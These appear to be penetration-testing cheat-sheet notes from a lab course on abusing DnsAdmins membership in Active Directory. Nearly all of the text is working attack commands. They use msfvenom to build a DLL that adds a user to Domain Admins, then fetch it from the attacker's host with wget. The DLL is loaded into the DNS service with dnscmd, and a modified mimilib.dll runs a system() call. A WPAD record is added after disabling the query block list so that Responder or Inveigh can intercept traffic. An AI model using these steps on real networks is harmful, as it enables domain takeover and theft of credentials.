## Leveraging DnsAdmins Access

- dnscmd can only be used by DnsAdmins
- ONLY PERFORM WITH PERMISSION

**Generating Malicious DLL
```
msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll
python3 -m http.server 7777
wget "http://10.10.14.3:7777/adduser.dll" -outfile "adduser.dll"
```

**Loading DLL
```
Get-ADGroupMember -Identity DnsAdmins
dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
```
- Must specify full path to dll or attack will not work
- DLL will be loaded the next time the DNS service is started

**Finding User's SID
```
wmic useraccount where name="netadm" get sid
```

**Checking Permissions on DNS Service
```
sc.exe sdshow DNS
```
- https://www.winhelponline.com/blog/view-edit-service-permissions-windows/

**Stopping the DNS Service
```
sc stop dns
```

**Starting the DNS Service
```
sc start dns
```

**Confirming Group Membership
```
net group "Domain Admins" /dom
```


## Cleaning Up (Requires local or domain admin account)

**Confirming Registry Key Added
```
reg query \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters
```

**Deleting Registry Key
```
reg delete \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters  /v ServerLevelPluginDll
```

**Starting the DNS Service Again
```
sc.exe start dns
```

**Checking DNS Service Status
```
sc query dns
```

**Using mimilib.dll
```
/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#include "kdns.h"

DWORD WINAPI kdns_DnsPluginInitialize(PLUGIN_ALLOCATOR_FUNCTION pDnsAllocateFunction, PLUGIN_FREE_FUNCTION pDnsFreeFunction)
{
	return ERROR_SUCCESS;
}

DWORD WINAPI kdns_DnsPluginCleanup()
{
	return ERROR_SUCCESS;
}

DWORD WINAPI kdns_DnsPluginQuery(PSTR pszQueryName, WORD wQueryType, PSTR pszRecordOwnerName, PDB_RECORD *ppDnsRecordListHead)
{
	FILE * kdns_logfile;
#pragma warning(push)
#pragma warning(disable:4996)
	if(kdns_logfile = _wfopen(L"kiwidns.log", L"a"))
#pragma warning(pop)
	{
		klog(kdns_logfile, L"%S (%hu)\n", pszQueryName, wQueryType);
		fclose(kdns_logfile);
	    system("ENTER COMMAND HERE");
	}
	return ERROR_SUCCESS;
}
```

## Creating a WPAD Record

- This allows our attack machine to become a proxy for traffic, so we can run Responder or Inveigh

**Disabling the Global Query Block List
```
Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local
```

**Adding a WPAD Record
```
Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address 10.10.14.3
```
